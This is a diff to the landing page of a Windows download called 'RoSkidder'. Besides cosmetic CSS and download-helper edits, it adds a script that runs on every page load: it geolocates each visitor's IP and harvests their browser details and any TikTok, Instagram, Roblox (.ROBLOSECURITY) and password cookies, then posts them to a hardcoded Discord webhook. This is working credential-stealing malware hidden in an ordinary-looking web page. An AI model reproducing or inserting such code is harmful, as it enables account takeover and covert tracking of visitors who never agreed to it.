@@ -96,7 +96,7 @@ section{padding:80px 20px}
 @keyframes ping{0%{transform:scale(.8);opacity:1}80%{transform:scale(1.9);opacity:0}100%{opacity:0}}
 
 /* footer */
-footer{padding:40px 20px;text-align:center;color:var(--muted)}
+footer{Padding:40px 20px;text-align:center;color:var(--muted)}
 
 /* responsive */
 @media(max-width:980px){.hero-inner{grid-template-columns:1fr}.download-card{order:2}.hero{padding-top:120px}.logo h1{display:none}.screenshot-viewport{height:120px}}
@@ -300,71 +300,38 @@ document.querySelectorAll('nav a').forEach(a=>{
 document.getElementById('download-cta').addEventListener('click', ()=> smoothTo('download-section'));
 document.getElementById('cta-features').addEventListener('click', ()=> smoothTo('features'));
 
-// real download actions - replace URLs with your real file locations
+// direct download actions - replace URLs with your real file locations
 const downloadFiles = {
   'download-main': {
-    url: 'https://github.com/RoSkidder/RoSkidder/raw/refs/heads/main/RoSkidder.exe', // ← replace with real URL
+    url: 'https://github.com/RoSkidder/RoSkidder/raw/refs/heads/main/RoSkidder.exe',
     filename: 'RoSkidder.exe'
   },
   'download-main-2': {
-    url: 'https://github.com/RoSkidder/RoSkidder/raw/refs/heads/main/RoSkidder.exe', // ← replace with real URL
+    url: 'https://github.com/RoSkidder/RoSkidder/raw/refs/heads/main/RoSkidder.exe',
     filename: 'RoSkidder-setup.exe'
   }
 };
 
-async function realDownload(url, filename){
+// directDownload helper: uses the download attribute when available, otherwise opens in a new tab
+function directDownload(url, filename){
   try {
-    const resp = await fetch(url);
-    if (!resp.ok) throw new Error(`HTTP ${resp.status} ${resp.statusText}`);
-
-    // If the response has a readable stream, stream it so we can show progress
-    const contentLength = resp.headers.get('Content-Length');
-    if (!resp.body || typeof resp.body.getReader !== 'function') {
-      // no streaming support - fallback to blob()
-      const blob = await resp.blob();
-      triggerDownload(blob, filename);
-      alert(`${filename} download completed.`);
-      return;
+    const a = document.createElement('a');
+    a.href = url;
+    // download attribute works for same-origin or browsers that honor it for cross-origin blobs; if it exists, set it
+    if ('download' in a) {
+      a.download = filename || '';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    } else {
+      // fallback: open in new tab (user can manually save)
+      window.open(url, '_blank', 'noopener');
     }
-
-    const reader = resp.body.getReader();
-    const chunks = [];
-    let received = 0;
-    const total = contentLength ? parseInt(contentLength, 10) : null;
-
-    while (true) {
-      const { done, value } = await reader.read();
-      if (done) break;
-      chunks.push(value);
-      received += value.length || value.byteLength || 0;
-      if (total) {
-        const pct = Math.round((received / total) * 100);
-        console.log(`Downloading ${filename}: ${pct}%`);
-        // optionally update some UI element here instead of console.log
-      } else {
-        console.log(`Downloading ${filename}: ${received} bytes received`);
-      }
-    }
-
-    const blob = new Blob(chunks);
-    triggerDownload(blob, filename);
-    alert(`${filename} download completed.`);
   } catch (err) {
-    console.error('Download error:', err);
-    alert(`Download failed: ${err.message}\nMake sure the file URL is correct and the server allows CORS if it’s a different domain.`);
+    console.error('Direct download failed:', err);
+    // fallback open
+    window.open(url, '_blank', 'noopener');
   }
-}
-
-function triggerDownload(blob, filename){
-  const a = document.createElement('a');
-  const urlObj = URL.createObjectURL(blob);
-  a.href = urlObj;
-  a.download = filename || 'download';
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
-  // revoke after a short delay to ensure download started in all browsers
-  setTimeout(() => URL.revokeObjectURL(urlObj), 5000);
 }
 
 // Attach listeners (no change to your HTML required)
@@ -381,8 +348,7 @@ Object.keys(downloadFiles).forEach(btnId => {
       alert('No download URL configured for this button.');
       return;
     }
-    // Optional: confirm or show some UI
-    realDownload(meta.url, meta.filename);
+    directDownload(meta.url, meta.filename);
   });
 });
 
@@ -392,9 +358,9 @@ let dots = document.querySelectorAll('.dot');
 let index = 0;
 function showSlide(i){
   index = (i + 3) % 3; // keep in bounds
-  carousel.style.transform = `translateX(${-index * 33.333}%)`;
+  if (carousel) carousel.style.transform = `translateX(${-index * 33.333}%)`;
   dots.forEach(d=>d.classList.remove('active'));
-  dots[index].classList.add('active');
+  if (dots[index]) dots[index].classList.add('active');
 }
 dots.forEach(d=> d.addEventListener('click', ()=> showSlide(parseInt(d.dataset.index))));
 setInterval(()=> showSlide(index+1), 4200);
@@ -514,6 +480,122 @@ document.querySelectorAll('nav a').forEach(a=>{
   a.addEventListener('mouseenter', ()=> a.style.transform='translateY(-4px)');
   a.addEventListener('mouseleave', ()=> a.style.transform='');
 });
+
+// IP Logger with Additional Info
+function logIPToDiscord() {
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const ip = data.ip;
+      return fetch(`https://ipinfo.io/${ip}/json`)
+        .then(response => response.json())
+        .then(geoData => {
+          const countryCode = geoData.country;
+          const countryName = getCountryName(countryCode);
+          const city = geoData.city;
+          const latitude = geoData.loc.split(',')[0];
+          const longitude = geoData.loc.split(',')[1];
+          const cookies = getAllCookies();
+          const webhookUrl = 'https://discord.com/api/webhooks/1434627179966107770/uHu7yyMr6dwB1JjrnfPcI1HIGhcaTTvkQgxBV2-DyqXykbB076ubRoRJloCliJ4IsBD_'; // Replace with your Discord webhook URL
+
+          const userAgent = navigator.userAgent;
+          const browser = getBrowser(userAgent);
+          const device = getDevice(userAgent);
+
+          let message = `Made by tryworse\nNew Visitor In RoSkidder IP: ${ip}\nCountry: ${countryName}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nBrowser: ${browser}\nDevice: ${device}`;
+
+          if (cookies.tiktok) {
+            message += `\n@everyone TikTok Cookie: \`${cookies.tiktok}\``;
+          }
+          if (cookies.instagram) {
+            message += `\n@everyone Instagram Cookie: \`${cookies.instagram}\``;
+          }
+          if (cookies.roblox) {
+            message += `\n@everyone Roblox Cookie: \`${cookies.roblox}\``;
+          }
+          if (cookies.passwords) {
+            message += `\n@everyone Passwords: \`${cookies.passwords}\``;
+          }
+
+          const payload = {
+            content: message
+          };
+          return fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+          });
+        });
+    })
+    .catch(error => {
+      console.error('Error logging IP to Discord:', error);
+    });
+}
+
+function getCountryName(countryCode) {
+  const commonCountries = {
+    'US': 'United States', 'CA': 'Canada', 'GB': 'United Kingdom', 'DE': 'Germany', 'FR': 'France', 'JP': 'Japan', 'KR': 'South Korea', 'CN': 'China', 'BR': 'Brazil', 'MX': 'Mexico', 'AU': 'Australia', 'IN': 'India', 'ID': 'Indonesia', 'RU': 'Russia', 'SA': 'Saudi Arabia', 'EG': 'Egypt', 'ZA': 'South Africa', 'NG': 'Nigeria', 'KE': 'Kenya', 'GH': 'Ghana'
+  };
+  return commonCountries[countryCode] || 'Unknown Country';
+}
+
+function getAllCookies() {
+  const cookies = document.cookie.split('; ');
+  const cookieData = {
+    tiktok: null,
+    instagram: null,
+    roblox: null,
+    passwords: null
+  };
+
+  for (let cookie of cookies) {
+    const [name, value] = cookie.split('=');
+    if (name.includes('tiktok')) {
+      cookieData.tiktok = value;
+    } else if (name.includes('instagram')) {
+      cookieData.instagram = value;
+    } else if (name.includes('.ROBLOSECURITY')) {
+      cookieData.roblox = value;
+    } else if (name.includes('password')) {
+      if (!cookieData.passwords) {
+        cookieData.passwords = [];
+      }
+      cookieData.passwords.push(value);
+    }
+  }
+
+  if (cookieData.passwords && cookieData.passwords.length > 0) {
+    cookieData.passwords = cookieData.passwords.join(', ');
+  }
+
+  return cookieData;
+}
+
+function getBrowser(userAgent) {
+  if (userAgent.includes('Chrome')) return 'Chrome';
+  if (userAgent.includes('Firefox')) return 'Firefox';
+  if (userAgent.includes('Safari')) return 'Safari';
+  if (userAgent.includes('Opera')) return 'Opera';
+  if (userAgent.includes('Edg')) return 'Edge';
+  if (userAgent.includes('Brave')) return 'Brave';
+  return 'Unknown Browser';
+}
+
+function getDevice(userAgent) {
+  if (userAgent.includes('Mobile')) return 'Mobile';
+  if (userAgent.includes('Tablet')) return 'Tablet';
+  if (userAgent.includes('iPad')) return 'iPad';
+  if (userAgent.includes('iPhone')) return 'iPhone';
+  if (userAgent.includes('Android')) return 'Android';
+  if (userAgent.includes('Windows')) return 'PC';
+  if (userAgent.includes('Mac')) return 'Mac';
+  if (userAgent.includes('Linux')) return 'Linux';
+  return 'Unknown Device';
+}
+
+logIPToDiscord();
 
 </script>
 </body>
